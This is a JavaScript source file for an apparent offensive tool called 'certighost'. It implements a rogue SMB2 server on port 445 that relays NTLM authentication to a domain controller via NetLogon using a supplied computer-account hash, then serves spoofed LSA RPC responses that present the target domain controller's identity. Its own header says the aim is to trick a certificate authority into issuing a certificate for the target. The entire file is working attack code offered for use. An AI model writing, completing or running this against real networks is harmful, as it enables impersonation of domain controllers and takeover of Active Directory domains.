// Rogue SMB2 server for certighost: listens on port 445 via TCPServerSocket,
// handles SMB2 NEGOTIATE + SESSION_SETUP (NTLM) + TREE_CONNECT + named pipe IO.
// Serves a minimal LSA RPC (lsarpc) that returns the target DC's identity,
// tricking the CA into issuing a certificate for the target.

import { concat } from './certify/ldap/ber.js';
import { NrpcClient } from './nrpc.js';

const CMD = { NEGOTIATE: 0, SESSION_SETUP: 1, LOGOFF: 2, TREE_CONNECT: 3, CREATE: 5, CLOSE: 6, READ: 8, WRITE: 9, IOCTL: 0x0b };
const ST = { SUCCESS: 0, MORE_PROCESSING: 0xc0000016, BUFFER_OVERFLOW: 0x80000005 };
const FSCTL_PIPE_TRANSCEIVE = 0x0011c017;

const u16 = (n) => { const b = new Uint8Array(2); new DataView(b.buffer).setUint16(0, n, true); return b; };
const u32 = (n) => { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, n >>> 0, true); return b; };
const u64 = (n) => { const b = new Uint8Array(8); new DataView(b.buffer).setBigUint64(0, BigInt(n), true); return b; };
const utf16le = (s) => { const b = new Uint8Array(s.length * 2); for (let i = 0; i < s.length; i++) { b[i * 2] = s.charCodeAt(i) & 0xff; b[i * 2 + 1] = s.charCodeAt(i) >> 8; } return b; };

async function hmacSha256_16(key, data) {
  const k = await globalThis.crypto.subtle.importKey('raw', key, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  return new Uint8Array(await globalThis.crypto.subtle.sign('HMAC', k, data)).slice(0, 16);
}

function spnegoNegTokenInit(mechToken) {
  const oidNtlm = Uint8Array.of(0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a);
  const mechList = tlv(0x30, oidNtlm);
  const inner = concat([tlv(0xa0, mechList), tlv(0xa2, tlv(0x04, mechToken))]);
  return tlv(0xa0, concat([Uint8Array.of(0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02), tlv(0xa0, tlv(0x30, inner))]));
}

function spnegoNegTokenResp(state, mechToken) {
  const inner = concat([
    tlv(0xa0, tlv(0x0a, Uint8Array.of(state))),
    ...(mechToken ? [tlv(0xa2, tlv(0x04, mechToken))] : []),
  ]);
  return tlv(0xa1, tlv(0x30, inner));
}

function spnegoExtractToken(buf) {
  let off = 0;
  while (off < buf.length) {
    const tag = buf[off++];
    let len = buf[off++];
    if (len & 0x80) { const nb = len & 0x7f; len = 0; for (let i = 0; i < nb; i++) len = (len << 8) | buf[off++]; }
    if (tag === 0x04) return buf.subarray(off, off + len);
    if (tag >= 0xa0) { const inner = spnegoExtractToken(buf.subarray(off, off + len)); if (inner) return inner; }
    off += len;
  }
  return null;
}

function tlv(tag, val) {
  const len = val.length;
  if (len < 0x80) return concat([Uint8Array.of(tag, len), val]);
  if (len < 0x100) return concat([Uint8Array.of(tag, 0x81, len), val]);
  return concat([Uint8Array.of(tag, 0x82, (len >> 8) & 0xff, len & 0xff), val]);
}

function buildNtlmChallenge(domainNB, domainDNS, serverNB, serverDNS, challenge) {
  const FL = 0xe2898235;
  const sig = Uint8Array.of(0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00);
  const dnbU = utf16le(domainNB);
  const dnsDomU = utf16le(domainDNS);
  const snbU = utf16le(serverNB);
  const sdnsU = utf16le(serverDNS);

  const avPair = (id, data) => concat([u16(id), u16(data.length), data]);
  const now = BigInt(Date.now() + 11644473600000) * 10000n;
  const ts = new Uint8Array(8);
  new DataView(ts.buffer).setBigUint64(0, now, true);
  const avPairs = concat([
    avPair(2, dnbU), avPair(4, dnsDomU), avPair(1, snbU), avPair(3, sdnsU),
    avPair(7, ts), avPair(0, new Uint8Array(0)),
  ]);

  const targetNameOff = 56;
  const avOff = targetNameOff + dnbU.length;
  const version = Uint8Array.of(0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f);

  const hdr = new Uint8Array(56);
  hdr.set(sig, 0);
  const dv = new DataView(hdr.buffer);
  dv.setUint32(8, 2, true);
  dv.setUint16(12, dnbU.length, true); dv.setUint16(14, dnbU.length, true); dv.setUint32(16, targetNameOff, true);
  dv.setUint32(20, FL, true);
  hdr.set(challenge, 24);
  dv.setUint16(40, avPairs.length, true); dv.setUint16(42, avPairs.length, true); dv.setUint32(44, avOff, true);
  hdr.set(version, 48);

  return concat([hdr, dnbU, avPairs]);
}

// ---- LSA RPC server ---------------------------------------------------------
function lsaBindAck(callId) {
  const ctx = concat([u16(0), u16(0), Uint8Array.of(0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60), u16(2), u16(0)]);
  const body = concat([u16(0x16d0), u16(0x16d0), u32(0), u16(0), u16(0), Uint8Array.of(1, 0, 0, 0), ctx]);
  const hdr = concat([Uint8Array.of(5, 0, 12, 0x03), Uint8Array.of(0x10, 0, 0, 0), u16(0), u16(0), u32(callId)]);
  const pdu = concat([hdr, body]);
  new DataView(pdu.buffer, pdu.byteOffset).setUint16(8, pdu.length, true);
  return pdu;
}

function lsaResponse(callId, stubData) {
  const body = concat([u32(stubData.length), u16(0), u16(0), stubData]);
  const hdr = concat([Uint8Array.of(5, 0, 2, 0x03), Uint8Array.of(0x10, 0, 0, 0), u16(0), u16(0), u32(callId)]);
  const pdu = concat([hdr, body]);
  new DataView(pdu.buffer, pdu.byteOffset).setUint16(8, pdu.length, true);
  return pdu;
}

function ndrUnicodeString(s, ref) {
  const u = utf16le(s);
  const chars = s.length;
  return { header: concat([u16(chars * 2), u16(chars * 2), u32(ref)]),
    deferred: concat([u32(chars), u32(0), u32(chars), u]) };
}

function ndrSid(sidStr) {
  const parts = sidStr.split('-');
  const rev = parseInt(parts[1]);
  const auth = parseInt(parts[2]);
  const subs = parts.slice(3).map(Number);
  const sidBytes = new Uint8Array(8 + subs.length * 4);
  sidBytes[0] = rev;
  sidBytes[1] = subs.length;
  sidBytes[2] = 0; sidBytes[3] = 0; sidBytes[4] = (auth >> 24) & 0xff;
  sidBytes[5] = (auth >> 16) & 0xff; sidBytes[6] = (auth >> 8) & 0xff; sidBytes[7] = auth & 0xff;
  const sdv = new DataView(sidBytes.buffer);
  for (let i = 0; i < subs.length; i++) sdv.setUint32(8 + i * 4, subs[i], true);
  return sidBytes;
}

class LsaRpcHandler {
  constructor(targetNB, targetDNS, targetForest, targetGuid, targetSid) {
    this._nb = targetNB;
    this._dns = targetDNS;
    this._forest = targetForest;
    this._guid = targetGuid;
    this._sid = targetSid;
    this._handle = new Uint8Array(20);
    this._handle.set([0x4c, 0x53, 0x41, 0x21], 4);
  }

  handleRpc(pdu) {
    const ptype = pdu[2];
    if (ptype === 11) return this._bind(pdu);
    if (ptype === 0) return this._request(pdu);
    return null;
  }

  _bind(pdu) {
    const callId = new DataView(pdu.buffer, pdu.byteOffset).getUint32(12, true);
    return lsaBindAck(callId);
  }

  _request(pdu) {
    const dv = new DataView(pdu.buffer, pdu.byteOffset, pdu.byteLength);
    const callId = dv.getUint32(12, true);
    const opnum = dv.getUint16(22, true);

    let stub;
    switch (opnum) {
      case 0:  stub = this._close(); break;
      case 6:  stub = this._openPolicy(); break;
      case 7:  stub = this._queryInfo(pdu); break;
      case 44: stub = this._openPolicy(); break;
      case 46: stub = this._queryInfo(pdu); break;
      default: stub = u32(0xc0000022);
    }
    return lsaResponse(callId, stub);
  }

  _close() { return concat([new Uint8Array(20), u32(0)]); }
  _openPolicy() { return concat([this._handle, u32(0)]); }

  _queryInfo(pdu) {
    const stubOff = 24;
    const infoClass = pdu.length > stubOff + 24 ? new DataView(pdu.buffer, pdu.byteOffset).getUint16(stubOff + 20, true) : 12;

    if (infoClass === 3) return this._policyPrimaryDomainInfo();
    if (infoClass === 5 || infoClass === 14) return this._policyAccountDomainInfo();
    if (infoClass === 6) return this._policyServerRole();
    if (infoClass === 12 || infoClass === 13) return this._policyDnsDomainInfo(infoClass);
    return concat([u32(0), u32(0xc0000022)]);
  }

  _policyDnsDomainInfo(infoClass) {
    const tag = infoClass;
    const ref = 0x20000;
    const n = ndrUnicodeString(this._nb, ref + 4);
    const d = ndrUnicodeString(this._dns, ref + 8);
    const f = ndrUnicodeString(this._forest, ref + 12);
    const sid = ndrSid(this._sid);

    const fixedPart = concat([
      u16(tag), u16(0),
      n.header, d.header, f.header,
      this._guid,
      u32(ref + 16),
    ]);
    const deferredPart = concat([
      n.deferred, d.deferred, f.deferred,
      u32(sid.length), sid,
    ]);
    return concat([u32(ref), fixedPart, deferredPart, u32(0)]);
  }

  _policyAccountDomainInfo() {
    const ref = 0x20000;
    const n = ndrUnicodeString(this._nb, ref + 4);
    const sid = ndrSid(this._sid);
    const fixedPart = concat([u16(5), u16(0), n.header, u32(ref + 8)]);
    const deferredPart = concat([n.deferred, u32(sid.length), sid]);
    return concat([u32(ref), fixedPart, deferredPart, u32(0)]);
  }

  _policyPrimaryDomainInfo() {
    const ref = 0x20000;
    const n = ndrUnicodeString(this._nb, ref + 4);
    const sid = ndrSid(this._sid);
    const fixedPart = concat([u16(3), u16(0), n.header, u32(ref + 8)]);
    const deferredPart = concat([n.deferred, u32(sid.length), sid]);
    return concat([u32(ref), fixedPart, deferredPart, u32(0)]);
  }

  _policyServerRole() {
    return concat([u32(0x20000), u16(6), u16(0), u32(3), u32(0)]);
  }
}

// ---- SMB2 server ------------------------------------------------------------
export class RogueSmbServer {
  constructor(opts) {
    this._dcIp = opts.dcIp;
    this._domain = opts.domain;
    this._domainNB = opts.domainNB;
    this._compName = opts.compName;
    this._compHash = opts.compHash;
    this._log = opts.log || (() => {});
    this._lsa = new LsaRpcHandler(opts.targetNB, opts.targetDNS, opts.targetForest, opts.targetGuid, opts.targetSid);
    this._server = null;
    this._running = false;
  }

  async start(bindAddr = '0.0.0.0', port = 445) {
    this._server = new TCPServerSocket(bindAddr, { localPort: port });
    this._running = true;
    this._log(`Rogue SMB: listening on ${bindAddr}:${port}`);
    this._acceptLoop();
  }

  async _acceptLoop() {
    try {
      const { readable } = await this._server.opened;
      const reader = readable.getReader();
      while (this._running) {
        const { value: conn, done } = await reader.read();
        if (done) break;
        this._handleClient(conn).catch(e => this._log(`Rogue SMB client error: ${e.message}`));
      }
    } catch (e) {
      if (this._running) this._log(`Rogue SMB accept error: ${e.message}`);
    }
  }

  async stop() {
    this._running = false;
    try { await this._server?.close(); } catch {}
  }

  async _handleClient(conn) {
    const { readable, writable } = await conn.opened;
    const reader = readable.getReader();
    const writer = writable.getWriter();
    let buf = new Uint8Array(0);
    let sessionId = 0n;
    let signingKey = null;
    let challenge = null;
    let treeId = 1;
    let fileId = new Uint8Array(16);
    let pipeBuf = new Uint8Array(0);

    const send = async (data) => { await writer.write(data); };
    const readMore = async () => {
      const { value, done } = await reader.read();
      if (done) throw new Error('disconnected');
      buf = concat([buf, new Uint8Array(value)]);
    };

    try {
      while (true) {
        while (buf.length < 4) await readMore();
        const pduLen = (buf[0] << 24) | (buf[1] << 16) | (buf[2] << 8) | buf[3];
        while (buf.length < 4 + pduLen) await readMore();
        const pdu = buf.subarray(4, 4 + pduLen);
        buf = buf.subarray(4 + pduLen);

        if (pdu[0] === 0xff && pdu[1] === 0x53) {
          await send(this._smb1NegotiateResponse());
          continue;
        }
        if (pdu[0] !== 0xfe || pdu[1] !== 0x53) continue;

        const cmd = new DataView(pdu.buffer, pdu.byteOffset).getUint16(12, true);

        switch (cmd) {
          case CMD.NEGOTIATE: {
            sessionId = BigInt('0x' + Array.from(globalThis.crypto.getRandomValues(new Uint8Array(8)), b => b.toString(16).padStart(2, '0')).join(''));
            await send(this._negotiate(pdu, sessionId));
            break;
          }
          case CMD.SESSION_SETUP: {
            const secBuf = this._extractSecurityBuffer(pdu);
            const ntlmMsg = spnegoExtractToken(secBuf) || secBuf;
            const msgType = ntlmMsg.length >= 12 ? new DataView(ntlmMsg.buffer, ntlmMsg.byteOffset).getUint32(8, true) : 0;

            if (msgType === 1) {
              challenge = globalThis.crypto.getRandomValues(new Uint8Array(8));
              const serverName = this._compName.replace(/\$$/, '');
              const challengeMsg = buildNtlmChallenge(this._domainNB, this._domain, serverName, `${serverName}.${this._domain}`, challenge);
              const spnego = spnegoNegTokenResp(1, challengeMsg);
              await send(this._sessionSetupResp(pdu, sessionId, ST.MORE_PROCESSING, spnego));
            } else if (msgType === 3) {
              let sk = null;
              try {
                const nlo = new NrpcClient(this._dcIp, this._compName, this._compHash, this._domain, this._log);
                await nlo.setup();
                const result = await nlo.validate(ntlmMsg, challenge);
                await nlo.close();
                if (result.errorCode === 0) {
                  sk = result.sessionKey;
                  this._log(`Rogue SMB: NTLM validated successfully`);
                } else {
                  this._log(`Rogue SMB: NTLM validation failed: 0x${result.errorCode.toString(16)}`);
                }
              } catch (e) {
                this._log(`Rogue SMB: NetLogon validation error: ${e.message}, continuing without signing`);
              }
              signingKey = sk;
              const spnego = spnegoNegTokenResp(0, null);
              await send(this._sessionSetupResp(pdu, sessionId, ST.SUCCESS, spnego));
            }
            break;
          }
          case CMD.TREE_CONNECT: {
            treeId++;
            await send(this._treeConnectResp(pdu, sessionId, treeId, signingKey));
            break;
          }
          case CMD.CREATE: {
            fileId = globalThis.crypto.getRandomValues(new Uint8Array(16));
            await send(this._createResp(pdu, sessionId, treeId, fileId, signingKey));
            break;
          }
          case CMD.IOCTL: {
            const stub = this._extractIoctlInput(pdu);
            const rpcResp = this._lsa.handleRpc(stub);
            if (rpcResp) pipeBuf = rpcResp;
            await send(this._ioctlResp(pdu, sessionId, treeId, fileId, rpcResp || new Uint8Array(0), signingKey));
            break;
          }
          case CMD.WRITE: {
            const writeData = this._extractWriteData(pdu);
            const rpcResp = this._lsa.handleRpc(writeData);
            if (rpcResp) pipeBuf = rpcResp;
            await send(this._writeResp(pdu, sessionId, signingKey));
            break;
          }
          case CMD.READ: {
            await send(this._readResp(pdu, sessionId, pipeBuf, signingKey));
            pipeBuf = new Uint8Array(0);
            break;
          }
          case CMD.CLOSE: {
            await send(this._closeResp(pdu, sessionId, signingKey));
            break;
          }
          case CMD.LOGOFF: {
            await send(this._logoffResp(pdu, sessionId, signingKey));
            return;
          }
        }
      }
    } catch (e) {
      if (e.message !== 'disconnected') this._log(`Rogue SMB: ${e.message}`);
    } finally {
      try { reader.releaseLock(); } catch {}
      try { writer.releaseLock(); } catch {}
      try { await conn.close(); } catch {}
    }
  }

  _smb2Header(cmd, status, sessionId, treeId = 0, mid = 0) {
    const h = new Uint8Array(64);
    h.set([0xfe, 0x53, 0x4d, 0x42], 0);
    const dv = new DataView(h.buffer);
    dv.setUint16(4, 64, true);
    dv.setUint16(6, 1, true);
    dv.setUint32(8, status >>> 0, true);
    dv.setUint16(12, cmd, true);
    dv.setUint16(14, 1, true);
    dv.setUint32(16, 0x01, true);
    dv.setBigUint64(24, BigInt(mid), true);
    dv.setUint32(36, treeId, true);
    dv.setBigUint64(40, sessionId, true);
    return h;
  }

  async _sign(pdu, signingKey) {
    if (!signingKey) return pdu;
    const dv = new DataView(pdu.buffer, pdu.byteOffset);
    dv.setUint32(16, dv.getUint32(16, true) | 0x08, true);
    pdu.set(new Uint8Array(16), 52);
    const sig = await hmacSha256_16(signingKey, pdu);
    pdu.set(sig, 52);
    return pdu;
  }

  _frame(pdu) {
    const framed = new Uint8Array(4 + pdu.length);
    new DataView(framed.buffer).setUint32(0, pdu.length, false);
    framed.set(pdu, 4);
    return framed;
  }

  _getMid(pdu) {
    return new DataView(pdu.buffer, pdu.byteOffset).getBigUint64(24, true);
  }

  _smb1NegotiateResponse() {
    const h = new Uint8Array(39);
    h.set([0xff, 0x53, 0x4d, 0x42], 0);
    h[4] = 0x72;
    h[9] = 0x98;
    h[32 + 5] = 0xff; h[32 + 6] = 0xff;
    const framed = new Uint8Array(4 + h.length);
    new DataView(framed.buffer).setUint32(0, h.length, false);
    framed.set(h, 4);
    return framed;
  }

  _negotiate(req, sessionId) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.NEGOTIATE, ST.SUCCESS, sessionId, 0, Number(mid));
    const body = new Uint8Array(65);
    const dv = new DataView(body.buffer);
    dv.setUint16(0, 65, true);
    dv.setUint16(2, 0, true);
    dv.setUint16(4, 0x0210, true);
    body.set(globalThis.crypto.getRandomValues(new Uint8Array(16)), 8);
    dv.setUint32(24, 0x07, true);
    dv.setUint32(28, 0x100000, true);
    dv.setUint32(32, 0x100000, true);
    dv.setUint32(36, 0x100000, true);
    const now = BigInt(Date.now() + 11644473600000) * 10000n;
    dv.setBigUint64(40, now, true);
    dv.setUint16(56, 128, true);
    dv.setUint16(58, 0, true);
    return this._frame(concat([hdr, body]));
  }

  _extractSecurityBuffer(pdu) {
    const dv = new DataView(pdu.buffer, pdu.byteOffset, pdu.byteLength);
    const bufOff = dv.getUint16(76, true);
    const bufLen = dv.getUint16(78, true);
    return pdu.subarray(bufOff, bufOff + bufLen);
  }

  _sessionSetupResp(req, sessionId, status, spnego) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.SESSION_SETUP, status, sessionId, 0, Number(mid));
    const body = new Uint8Array(9);
    new DataView(body.buffer).setUint16(0, 9, true);
    const secOff = 64 + 8;
    new DataView(body.buffer).setUint16(4, secOff, true);
    new DataView(body.buffer).setUint16(6, spnego.length, true);
    return this._frame(concat([hdr, body, spnego]));
  }

  async _treeConnectResp(req, sessionId, tid, signingKey) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.TREE_CONNECT, ST.SUCCESS, sessionId, tid, Number(mid));
    const body = new Uint8Array(16);
    const dv = new DataView(body.buffer);
    dv.setUint16(0, 16, true);
    dv.setUint8(2, 2);
    dv.setUint32(4, 0x30, true);
    dv.setUint32(8, 0x001f01ff, true);
    dv.setUint32(12, 0x001f01ff, true);
    let pdu = concat([hdr, body]);
    pdu = await this._sign(pdu, signingKey);
    return this._frame(pdu);
  }

  async _createResp(req, sessionId, tid, fid, signingKey) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.CREATE, ST.SUCCESS, sessionId, tid, Number(mid));
    const body = new Uint8Array(89);
    const dv = new DataView(body.buffer);
    dv.setUint16(0, 89, true);
    dv.setUint8(2, 1);
    dv.setUint32(4, 2, true);
    const now = BigInt(Date.now() + 11644473600000) * 10000n;
    dv.setBigUint64(8, now, true);
    dv.setBigUint64(16, now, true);
    dv.setBigUint64(24, now, true);
    dv.setBigUint64(32, now, true);
    body.set(fid, 64);
    let pdu = concat([hdr, body]);
    pdu = await this._sign(pdu, signingKey);
    return this._frame(pdu);
  }

  _extractIoctlInput(pdu) {
    const dv = new DataView(pdu.buffer, pdu.byteOffset, pdu.byteLength);
    const inputOff = dv.getUint32(88, true);
    const inputLen = dv.getUint32(92, true);
    if (!inputLen) return new Uint8Array(0);
    return pdu.subarray(inputOff, inputOff + inputLen);
  }

  async _ioctlResp(req, sessionId, tid, fid, output, signingKey) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.IOCTL, ST.SUCCESS, sessionId, tid, Number(mid));
    const body = new Uint8Array(49);
    const dv = new DataView(body.buffer);
    dv.setUint16(0, 49, true);
    dv.setUint32(4, FSCTL_PIPE_TRANSCEIVE, true);
    body.set(fid, 8);
    const outOff = 64 + 48;
    dv.setUint32(36, outOff, true);
    dv.setUint32(40, output.length, true);
    let pdu = concat([hdr, body, output]);
    pdu = await this._sign(pdu, signingKey);
    return this._frame(pdu);
  }

  _extractWriteData(pdu) {
    const dv = new DataView(pdu.buffer, pdu.byteOffset, pdu.byteLength);
    const dataOff = dv.getUint16(70, true);
    const dataLen = dv.getUint32(72, true);
    return pdu.subarray(dataOff, dataOff + dataLen);
  }

  async _writeResp(req, sessionId, signingKey) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.WRITE, ST.SUCCESS, sessionId, 0, Number(mid));
    const body = new Uint8Array(17);
    new DataView(body.buffer).setUint16(0, 17, true);
    let pdu = concat([hdr, body]);
    pdu = await this._sign(pdu, signingKey);
    return this._frame(pdu);
  }

  async _readResp(req, sessionId, data, signingKey) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.READ, ST.SUCCESS, sessionId, 0, Number(mid));
    const body = new Uint8Array(17);
    const dv = new DataView(body.buffer);
    dv.setUint16(0, 17, true);
    dv.setUint8(2, 64 + 16);
    dv.setUint32(4, data.length, true);
    let pdu = concat([hdr, body, data]);
    pdu = await this._sign(pdu, signingKey);
    return this._frame(pdu);
  }

  async _closeResp(req, sessionId, signingKey) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.CLOSE, ST.SUCCESS, sessionId, 0, Number(mid));
    const body = new Uint8Array(60);
    new DataView(body.buffer).setUint16(0, 60, true);
    let pdu = concat([hdr, body]);
    pdu = await this._sign(pdu, signingKey);
    return this._frame(pdu);
  }

  async _logoffResp(req, sessionId, signingKey) {
    const mid = this._getMid(req);
    const hdr = this._smb2Header(CMD.LOGOFF, ST.SUCCESS, sessionId, 0, Number(mid));
    const body = new Uint8Array(4);
    new DataView(body.buffer).setUint16(0, 4, true);
    let pdu = concat([hdr, body]);
    pdu = await this._sign(pdu, signingKey);
    return this._frame(pdu);
  }
}
